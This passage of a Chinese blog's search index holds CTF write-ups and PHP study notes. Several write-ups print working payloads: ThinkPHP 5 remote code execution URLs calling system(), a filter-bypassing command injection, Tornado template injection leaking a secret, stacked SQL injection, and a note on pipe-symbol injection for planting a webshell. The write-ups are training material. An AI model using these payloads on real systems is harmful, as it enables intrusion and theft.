注意：右边是一个整体！","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php","slug":"php","permalink":"http://lingxin16.github.io/tags/php/"}]},{"title":"ctfhub-信息泄露-Git泄露","slug":"ctfhub-信息泄露-Git泄露","date":"2020-03-14T07:32:00.000Z","updated":"2020-07-15T09:57:38.858Z","comments":true,"path":"2020/03/14/ctfhub-信息泄露-Git泄露/","link":"","permalink":"http://lingxin16.github.io/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/","excerpt":"Log启动环境","text":"Log启动环境 在/.git/config中有内容，直接githack 在文件夹中并没有找到flag文件 使用git log查看记录 可以看到在第二条记录中能看到add flag 使用git reset --hard 59218d2bc0dc24072e15f3bd2dc8a89692f90ac2恢复记录 得到一个txt文件，打开得到flag 或者使用git diff 59218d2bc0dc24072e15f3bd2dc8a89692f90ac2查看当前记录和add flag的区别 得到flag Stash启动环境 用githack处理得到 再查看日志找到查看add flag目录发现并没有flag 在.git/refs/stash文件中发现5a1c50dc9be3bb089c2f9a1e737cea77f0e0c32f git diff 5a1c50dc9be3bb089c2f9a1e737cea77f0e0c32f得到flag Index同样用githack处理文件 在txt文件中发现flag 相关说明： 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"php学习day2","slug":"php学习day2","date":"2020-03-13T13:34:00.000Z","updated":"2020-07-15T09:57:53.354Z","comments":true,"path":"2020/03/13/php学习day2/","link":"","permalink":"http://lingxin16.github.io/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/","excerpt":"数据类型判断","text":"数据类型判断 通过一组类型判断函数，来判断变量，最终返回这个变量所保存数据的数据类型(相同为true,否则为false)：是一组以is_开头后面跟类型名字的函数 is_×××(变量名) Bool(布尔)类型不能用echo来查看，可以使用var_dump来查看 Var_dump(变量1,变量2…) Var_dump(is_int($a));Gettype(变量名)：获取类型 得到的是该类型对应的字符串 Settype(变量名,类型)：设定数据类型，与强制转换不同 1.强制转换(类型)变量名，是对数据复制的内容进行处理（不会处理实际存储的内容） 2.Settype会直接改变数据本身 整数类型进制整数类型在PHP中提供了四种整型的定义方式：十进制定义、二进制定义、八进制定义、十六进制定义 $a=120; //10进制 $a=0b110; //2进制 $a=0120; //8进制 $a=0×120; //16进制默认的PHP输出数值都会自动转换成10进制 整数类型进制转换 Decbin(): 十进制转二进制 Decoct(): 十进制转八进制 Dechex(): 十进制转十六进制 Bindec(): 二进制转十进制 ……以此类推 var_dump(decbin(107));","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php","slug":"php","permalink":"http://lingxin16.github.io/tags/php/"}]},{"title":"php学习day1","slug":"php学习day1","date":"2020-03-12T07:15:35.000Z","updated":"2020-07-15T11:24:28.518Z","comments":true,"path":"2020/03/12/php学习day1/","link":"","permalink":"http://lingxin16.github.io/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/","excerpt":"常量","text":"常量 常量定义：常量在定义时必须赋值 define(‘常量名’,常量值)； const 常量名 = 常量值;//(php5.3之后) 常量名命名规则: 1.常量的名字组成由字母、数字和下划线组成，不能以数字开头 2.常量的名字通常是以大写字母为主(为了与变量区别) 3.常量的名字可以使用一些特殊符号(如-_-(只能使用define)) 特殊名字的常量在访问时需要用echo constant(‘常量名’); 系统常量系统常量:系统定义，用户可以直接调用。 常见系统常量: PHP_VERSION：PHP版本号 PHP_INT_SIZE：整形大小 PHP_INT_MAX：整形能表示的最大值 特殊常量由双下划线开始+常量名+双下划线结束(系统魔术常量) 会随着环境变化，但无法改变 __DIR__：当前被执行的脚本所在电脑的绝对路径 __FILE__：当前被执行的脚本所在电脑的绝对路径（带自己的文件名） __LINE__：当前所属的行数 __NAMESPACE__：当前所属的命名空间 __CLASS__：当前所属的类 __METHOD__：当前所属的方法数据类型数据类型：data type，在PHP中指的是存储的数据本身的类型，而不是变量的类型。PHP是一种弱类型语言，变量本身没有数据类型。 PHP的八种数据类型：在PHP中将数据分为三大类八小类 简单(基本)数据类型：4小类整型：int/integer，系统分配4个字节存储，表示整数类型 浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数 字符串型：string，系统根据实际长度分配，表示字符串(引号) 布尔类型：bool/boolean，表示布尔类型，只有两个值：true和false 复合数据类型：2小类对象类型：object，存放对象(面向对象) 数组类型：array，存储多个数据(一次性) 特殊数据类型：2小类资源类型：resource，存放资源数据(PHP外部数据，如数据库、文件) 空类型：NULL，只有一个值就是NULL(不能运算) 类型转换1.自动转换：系统根据需求自己判断、自己转换 2.强制(手动)转换：认为根据需要的目标类型转换 在转换过程中用的比较多的就是转布尔类型(判断)和转数值类型(算数运算) 1.布尔true为1，false为0 2.字符串转数值有自己的规则 2.1以字母开头的字符串永远为0 2.2以数字开头的字符串，取到碰到字符串为止(不会同时包含两个小数点)","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php","slug":"php","permalink":"http://lingxin16.github.io/tags/php/"}]},{"title":"ctfhub-信息泄泄露_备份文件下载","slug":"ctfhub-信息泄泄露-备份文件下载","date":"2020-03-10T08:47:00.000Z","updated":"2020-07-15T09:58:16.837Z","comments":true,"path":"2020/03/10/ctfhub-信息泄泄露-备份文件下载/","link":"","permalink":"http://lingxin16.github.io/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","excerpt":"题目 网站源码","text":"题目 网站源码 给的一些提示 在www.zip中找到备份文件下载 由于在三个文件中都没有找到flag 最后访问网站的三个目录，在/flag_716325087.txt中找到flag bak文件 打开index.php.bak下载备份文件 记事本打开得到flag vim缓存查看页面 关于vim缓存： 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容 以 index.php 为例：第一次产生的交换文件名为 .index.php.swp 再次意外退出后，将会产生名为 .index.php.swo 的交换文件 第三次产生的交换文件则为 .index.php.swn访问.index.php.swp下载文件 打开拖到最后 得到flag .DS_Store题目 访问.DS_Store下载 打开发现一个txt文件(也可以使用Python-dsstore工具处理)附上下载地址：https://github.com/gehaxelt/Python-dsstore 访问这个地址(去掉空格)得到flag 关于.DS_Store .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"攻防世界-php_rce","slug":"攻防世界-php_rce","date":"2020-03-09T08:05:00.000Z","updated":"2020-07-15T09:58:33.438Z","comments":true,"path":"2020/03/09/攻防世界-php_rce/","link":"","permalink":"http://lingxin16.github.io/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/","excerpt":"第一次见thinkPHP，以前只有听过","text":"第一次见thinkPHP，以前只有听过 刚看到还以为我容器坏了…其实并没有 题目是phprce，我们先来介绍一下rce(远程代码执行漏洞)，百度结果如下： 1. 什么是远程代码执行漏洞 远程命令/代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。 2. 漏洞产生的根本原因 服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。页面也说明了是ThinkPHP V5版本 百度得知这个版本的确有远程代码执行漏洞 ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。直接上payload 查找flag http://111.198.29.45:43736/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot; cat http://111.198.29.45:43736/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 附上一些查找到的函数 PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort() PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"ctfshow-萌新赛","slug":"ctfshow-萌新赛","date":"2020-03-08T05:16:00.000Z","updated":"2020-07-15T09:58:45.532Z","comments":true,"path":"2020/03/08/ctfshow-萌新赛/","link":"","permalink":"http://lingxin16.github.io/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/","excerpt":"萌新赛web_签到题源码：","text":"萌新赛web_签到题源码： 这道题的预期解是命令执行 构造payload ?url=;ls;发现flag index.php两个目录 再构造payload ?url=;cat flag;得到flag 然后我做的时候是直接访问/flag 下载flag文件得到flag 不愧是我(萌新) 萌新赛密码学_签到题Ao(mgHX^E)AN2PSBOu3qI0o 直接base85解码得到flag 萌新赛密码学_抱我下载flag.py 完全不懂的py脚本，就交给呆头鹅林师傅了 最后林师傅解出来的随机数列 d f l 3 3 { 6 { 6 g 3 a f a 6 { 3 } a g { } a a g d f } 6 f 3 6 d { d f l { 6 a 6 g a f d d f g } { 3 f } } 6 l a { 3 } f d f 3 } g l a } 6 } l g 6 g 6 d f l f { d f g d 3 f d f g { g 6 a } a 3 { 6 } f a { } f } f } } }结合群主的爱好，盲猜flag{36d}！！！ 萌新赛杂项_qrcode题目下载下来打开是一段二进制，结合题目qrcode应该是二进制和二维码之间的转换 1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111直接上脚本 from PIL import Image MAX = 25 pic = Image.new(&quot;RGB&quot;,(MAX, MAX)) str = &quot;得到的二进制数字&quot; i=0 for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &#39;1&#39;): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1 pic.show() pic.save(&quot;flag.png&quot;)得到二维码，扫描得flag 萌新赛杂项_签到查看源代码 发现第十行代码意外的长 把下面下载下来用notepad打开 查看第十行 把tab替换成1，空格替换成转换字符串 得到 -.... -.... -.... -.-. -.... .---- -.... --... --... -... ....- -.. -.... ..... -.... . -.... --... ....- -.. -.... ..... -.... . -.... --... ....- ....- -.... .---- --... -..摩斯解码处理 得到十六进制 666c61677b4d656e674d656e6744617d最后转换ASCII码得到flag{MengMengDa} 萌新赛杂项_劝退警告下载下来是一张gif，直接改后缀.zip解压发现压缩包 压缩包中两个文件flag2.zip和sudoku.png 右边的注释说明密码需要我们解数独 但是sudoku.png也显示是加密的 这里我用Ziperello来爆破发现导入压缩包的时候显示只有一个文件是加密的 那么这个sudoku.png就可能是伪加密，通过修改二进制解压出sudoku.png 然后在线解数独，通过注释说明的方法得到flag2.zip的密码得到flag2.zip 结果flag2.zip还有密码，而且不是伪加密，只有注释:这道题很难，你现在离开还来得及。 我可能会离开吗！必不可能啊。通过与群里的几位师傅商量，我们最终觉得这应该是明文爆破，但是怎么构造明文可就难倒大家了。 也不难发现，这个说明.txt大小只有1kb 48字节，我们通过把注释写到txt中惊奇的发现也是48字节！！！（有的师傅是36字节，原因是txt的编码方式不同，更改编码方式就行） 直接开始爆破，在爆破的过程中一半我们不用等爆破完直接停止就能得到恢复后的文件 ，但是这个不能立即停止…..足足爆破了两个小时也没停 最后发现是停止的时间问题（明文爆破分两个阶段，第一个阶段我们就能得到恢复后的文件，第二阶段是寻找密码的过程。我们只需要解压后的文件，不需要密码，所以在第一阶段结束后就可以停止了，时间长的话就没有办法立即停止了。。。orz） 得到的这个flag.zip就很好爆破了，这里我是根据注释，写出了字典爆破，大家也可以用掩码爆破，得到open your eye.jpg根据文件名，猜到用silenteye来提取隐藏信息 得到flag.txt 不难发现是16进制 直接扔到winhex 猜测是pyc文件 关于pyc文件是py文件运行时产生的，我们可以通过反编译得到py文件，反编译的话有在线反编译的 得到 (lambda __print, __g, __y, __operator: [ [ [ [ [ [ (check(0), None)[1] for __g[&#39;check&#39;], check.__name__ in [ ( lambda x: (lambda __l: [ [ (lambda __sentinel, __after, __items: __y(lambda __this: lambda : (lambda __i: [ [ (lambda __sentinel, __after, __items: __y(lambda __this: lambda : (lambda __i: [ [ __this() for __l[&#39;n&#39;] in [__operator.iadd(__l[&#39;n&#39;], decode(arr[int(__l[&#39;i&#39;])] + decode(arr[11] + chr(61) * 2) * 2))] ][0] for __l[&#39;i&#39;] in [__i] ][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())([], lambda : [ __this() for __l[&#39;v&#39;] in [__operator.iadd(__l[&#39;v&#39;], chr(int(__l[&#39;n&#39;])))] ][0], iter(__l[&#39;c&#39;])) for __l[&#39;n&#39;] in [&#39;&#39;] ][0] for __l[&#39;c&#39;] in [__i] ][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())([], lambda : (lambda __after: (__print(__l[&#39;v&#39;]), __after())[1] if __l[&#39;x&#39;] == 1 else __after())(lambda : None), iter(flag.split(decode(arr[10] + decode(arr[11] + chr(61) * 2) * 2)))) for __l[&#39;v&#39;] in [&#39;&#39;] ][0] for __l[&#39;x&#39;] in [x] ][0])({}), &#39;check&#39;)] ][0] for __g[&#39;decode&#39;], decode.__name__ in [(lambda s: (lambda __l: [ base64.b64decode(__l[&#39;s&#39;].encode()).decode() for __l[&#39;s&#39;] in [s] ][0])({}), &#39;decode&#39;)] ][0] for __g[&#39;encode&#39;], encode.__name__ in [(lambda s: (lambda __l: [ base64.b64encode(__l[&#39;s&#39;].encode()).decode() for __l[&#39;s&#39;] in [s] ][0])({}), &#39;encode&#39;)] ][0] for __g[&#39;flag&#39;] in [&#39;136-139-78-132-162-89-49-117-70-161-49-118-70-02-01-01-70-137-01-160&#39;] ][0] for __g[&#39;arr&#39;] in [[&#39;NQ&#39;, &#39;MQ&#39;, &#39;Mw&#39;, &#39;MA&#39;, &#39;NA&#39;, &#39;Ng&#39;, &#39;Mg&#39;, &#39;OQ&#39;, &#39;Nw&#39;, &#39;OA&#39;, &#39;LQ&#39;, &#39;PQ&#39;]] ][0] for __g[&#39;base64&#39;] in [__import__(&#39;base64&#39;, __g, __g)] ][0])(__import__(&#39;__builtin__&#39;, level=0).__dict__[&#39;print&#39;], globals(), lambda f: (lambda x: x(x))(lambda y: f(lambda : y(y)())), __import__(&#39;operator&#39;, level=0))通过hint改check(0)为check(1)运行得到flag 萌新赛杂项_萌新福利解压得到show.bin文件 根据提示求反 输出音频文件，得到flag(小姐姐声音真好听……)","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"比赛记录","slug":"比赛记录","permalink":"http://lingxin16.github.io/tags/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"}]},{"title":"2020年新春战疫—网络安全公益赛-套娃","slug":"2020年新春战疫—网络安全公益赛-套娃","date":"2020-03-03T08:25:00.000Z","updated":"2020-07-15T09:58:56.343Z","comments":true,"path":"2020/03/03/2020年新春战疫—网络安全公益赛-套娃/","link":"","permalink":"http://lingxin16.github.io/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/","excerpt":"1.zip 解压后得到下列文件","text":"1.zip 解压后得到下列文件 对Brainfuck在下面网站进行解密，得到 dcaf03aa88d038686c5e8067a7a45ff8 https://www.splitbrain.org/services/ook二进制编辑1.连环画.png 得到 part1:068c使用上面的解密值，解压2.zip2.zip 解压后得到下列文件 二进制编辑2.连环画.jpeg，得到 part2:555b 爆破3.zip 得到压缩包密码 33023.zip 解压后得到下列文件 修改伪加密位解压4.zip LSB隐写查看得到part3:578b 4.zip 解压后得到文件 根据提示使用明文攻击，解压5.zip 这里可以不用等全部结束，点击停止，可释放已解密部分文件 爆破4.png的高度，可获得part4:0eae 5.zip解压后获得下面文件： 使用猪圈密码得到压缩包密码：fojiajielv 对5.连环画进行拼接得到part5:9d4b 6.zip解压后得到下面文件 使用佛经解密得到压缩包密码 对6.jpg进行binwalk，可以看到莫斯密码，对莫斯密码进行解密得到part6:e52bd67 7.zip解压后得到文件如下： 使用identify查看帧率隐写 得到 使用二进制符号进行替换，得到part7:61562 通过银河字母表得到压缩包密码：yinhezm 8.zip解压后得到文件： 提交32位人事：part1:068cpart2:555bpart3:578bpart4:0eaepart5:9d4bpart6:e52bd67part7:61562合并得到 ：068c555b578b0eae9d4be52bd67615629.rar解压后得到 使用AltermateStreamView工具提取数据流 拿到falg FLAG值：flag{8739459c-8d4e-4a34-92ee-5d75ae56ac4f} wp来自wp.ctf.show","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"比赛记录","slug":"比赛记录","permalink":"http://lingxin16.github.io/tags/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"}]},{"title":"ctfshow游戏题","slug":"ctfshow游戏题","date":"2020-03-03T07:53:31.000Z","updated":"2020-07-15T11:25:25.181Z","comments":true,"path":"2020/03/03/ctfshow游戏题/","link":"","permalink":"http://lingxin16.github.io/2020/03/03/ctfshow%E6%B8%B8%E6%88%8F%E9%A2%98/","excerpt":"misc22下载下来的压缩包，里边备注的有游戏地址，并且表明了这是个存档","text":"misc22下载下来的压缩包，里边备注的有游戏地址，并且表明了这是个存档 载入存档之后删除围墙 发现右下角地图的flag 有一说一这游戏真好玩 附上游戏地址https://yorg.io/ 超级玛丽下载下来是nes文件，然后我们需要下载模拟器工具才能打开。我这里下载的是VirtuaNES 利用模拟器自带的金手指，搜索一些金手指代码，通关后公主会告诉你flag 这里我用的金手指代码： 0704-01-00 超能力(00水中大跳,01空中游泳) 075F-01-00 选大关(00-??,??由作品决定) 魂斗罗 游戏flag 终结篇和超级玛丽差不多，不过这里的flag是藏在最后一关的地图里，需要多观察。 不过其实这个flag也可以猜出来，嘿嘿 附上金手指代码： 0032-01-20（1P生命无限） 00B0-01-FF（1P无敌） 植物大战僵尸出题人表示flag在通关后的mv里，这要是通关可要花点时间了，但是我们有两种办法可以读取 1.直接从网上复制别人的存档，修改本地存档，然后在制作人员那里可以观看mv 2.直接解pak包，在pak包里寻找flag 最终的flag是mv的背景音乐 不过我实在是听不出来正确的flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://lingxin16.github.io/tags/misc/"}]},{"title":"ctfshow红包题-web","slug":"ctfshow红包题-web","date":"2020-02-15T10:44:32.000Z","updated":"2020-07-15T11:29:23.719Z","comments":true,"path":"2020/02/15/ctfshow红包题-web/","link":"","permalink":"http://lingxin16.github.io/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/","excerpt":"直接看源代码","text":"直接看源代码 发现hint：?cmd= 可以推测大概是构造payload 接下来访问url/?cmd 通过观察发现过滤了不少符号，键盘上能用的没几个了……害 根据大佬给的提示，我们用仅存的几个符号构造payload ?cmd=?&gt;&lt;?=`/???/?p /???????? p.ppp`;?&gt;功能相当于是 ?cmd=?&gt;&lt;?=`/bin/cp /flag.txt p.ppp`;?&gt;用cp命令，将flag.txt复制到p.ppp 接下来访问url/p.ppp，下载下来得到flag 关于构造的payload可以解释下?&gt;是关闭php标签 &lt;?=是使用php短标签来返回结果`是执行命令 而出题人给出的payload是 ?cmd=?&gt;&lt;?=`/??p/p?p??????`;?&gt;是匹配到/tmp/phpXXXXXX文件，匹配到之后执行","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"Hgame-Week1-web","slug":"Hgame-Week1-web","date":"2020-01-31T16:35:00.000Z","updated":"2020-07-15T10:01:15.937Z","comments":true,"path":"2020/02/01/Hgame-Week1-web/","link":"","permalink":"http://lingxin16.github.io/2020/02/01/Hgame-Week1-web/","excerpt":"web1-Cosmos 的博客打开网站","text":"web1-Cosmos 的博客打开网站 发现提及到博客、github、版本管理工具，可以联想到git泄露（hexo博客能是白搭建的吗！！！） 构造url(/.git/config) http://cosmos.hgame.n3ko.co/.git/config 发现目标仓库 https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc 根据提示解码 web2-接头霸王根据提示利用burpsuit修改HTTP请求头 如图 得到flag web3-Code World打开之后发现报错403 Forbidden 查看源代码发现 很显然是被人刻意改动了，然后跳转到了/new.php 我们用burpsuit抓包发现其实报错是405 Not Allowed 百度一下405 Not Allowed这个报错 就是两种请求方式之间出错 然后我们修改请求方式即可正常打开 根据提示利用url传参?a=4+6 这里+需要url编码%2b 即?a=4%2b6 然后利用POST请求得到flag web4-🐔尼泰玫打开是个小游戏 cxk打篮球(手动滑稽) 提示我们需要30000分才能拿到flag 然后我们在网络状态中发现了submit这个文件 查看之后发现是把分数数据发送给后台然后判断，我们直接抓包编辑重发 得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"比赛记录","slug":"比赛记录","permalink":"http://lingxin16.github.io/tags/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"}]},{"title":"护网杯2018-easy_tornado","slug":"护网杯2018-easy_tornado","date":"2020-01-29T08:01:10.000Z","updated":"2020-07-15T11:28:58.296Z","comments":true,"path":"2020/01/29/护网杯2018-easy_tornado/","link":"","permalink":"http://lingxin16.github.io/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/","excerpt":"首先看题","text":"首先看题 里边的内容分别是 )) 我们可以直接得出flag所在的文件夹是/fllllllllllllag 分析这三个的url http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=3af0858a46186b7d343f7dd9419e1525 http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=f9793be52dec6c36581bb8429f8c1039 http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=e9155f0f3d25f1ad639771ca93cb5e5d 我们可以得出这样的结论，flag所在文件的url应该是http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=** 至于这个**应该就是md5(cookie_secret+md5(filename)) filename我们已经知道是fllllllllllllag，那么我们接下来只需要找到cookie_secret 利用burp抓包我们并没有找到cookie，只能上百度了……（那咋办嘛） 通过百度得知在error页面存在SSTI模板注入（又是一个看不懂的东西……） 附上关于SSTI模板注入的博客：SSTI完全学习 注入方式大概就是error?msg=0 ……？？？？？？至于注入啥玩意儿，大佬说的是用handler.settings对象(这又是啥玩意儿，咱也不知道，咱也不敢问) 那么传递error?msg= http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/error?msg= 得到这个回显 ‘cookie_secret’: ‘66015e24-a274-4abf-bd65-6776ae208dc4’} 接下来构造 http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=ee31ce84bedac7c8242d99b3047d4ad1 访问得到 我太难了….","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"强网杯-随便注","slug":"强网杯-随便注","date":"2020-01-12T07:06:22.000Z","updated":"2020-07-15T11:28:29.287Z","comments":true,"path":"2020/01/12/强网杯-随便注/","link":"","permalink":"http://lingxin16.github.io/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"通过简单的注入 1&#39; 1&#39;# 1&#39;;order by 1;# 1&#39; union select 1,2#得出有过滤规则","text":"通过简单的注入 1&#39; 1&#39;# 1&#39;;order by 1;# 1&#39; union select 1,2#得出有过滤规则 return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 一些select update delect语句都被过滤了 那么我们就用堆叠注入（不要问为什么，我百度来的） 首先介绍一下堆叠注入，简单来说就说将多条语句并列执行（语句1;语句2）同时执行语句1,2 1‘;show databases;# 查数据库 1‘;show tables;# 查表 发现有两个表 1&#39;;show columns from 1919810931114514;# 1&#39;;show columns from words;# 分别查第一张表和第二张表 这里的1919810931114514要用反引号`括起 （数字串为表名的表操作时要加反引号） 在第一张表中发现了flag字段 但是只有words表有回显，然后看了一下大佬的绕过规则 这里通过修改表名 1&#39;;rename tables &#39;words&#39; to &#39;words1&#39;;rename tables &#39;1919810931114514&#39; to &#39;words&#39;; alter table &#39;words&#39; change &#39;flag&#39; &#39;id&#39; varchar(100);# 然后用1’ or 1=1#得到flag 这里还有大佬的另外几种绕过方式（通过mysql预处理） 语句1： 1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# 是将select * from ’1919810931114514‘转化为16进制 语句2； 1&#39;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from 1919810931114514&quot;);PREPARE sqla from @sql;EXECUTE sqla;# (char(115,101,108,101,99,116)是把s e l e c t的ascii码转换为字符连接起来，再把后面的拼接起来就成了select * from ‘1919810931114514’)","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"创建单页","slug":"创建单页","date":"2020-01-02T10:03:53.000Z","updated":"2020-07-15T11:26:32.186Z","comments":true,"path":"2020/01/02/创建单页/","link":"","permalink":"http://lingxin16.github.io/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/","excerpt":"先用hexo new page ceshi建立一个ceshi的单页 通过在文件头中加入layout:false跳过主题渲染","text":"先用hexo new page ceshi建立一个ceshi的单页 通过在文件头中加入layout:false跳过主题渲染 然后将html代码插入到 {% raw %} ``` 和 ``` {% endraw %}中，就可以了。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"http://lingxin16.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"管道符漏洞","slug":"管道符漏洞","date":"2019-12-31T17:01:18.000Z","updated":"2020-07-15T11:27:56.161Z","comments":true,"path":"2020/01/01/管道符漏洞/","link":"","permalink":"http://lingxin16.github.io/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"在ping的地址后利用管道符|，||，&amp;，&amp;&amp;进行命令执行 例如127.0.0.1&amp;&amp;ls 利用127.0.0.1&amp;&amp;echo &#39;一句话&#39; &gt;1.php 将自己的马写到1.php中 &amp;&amp;后跟命令 比如重命名文件命令 127.0.0.1&amp;&amp;mv 1.txt 1.php将1.txt重命名为1.php 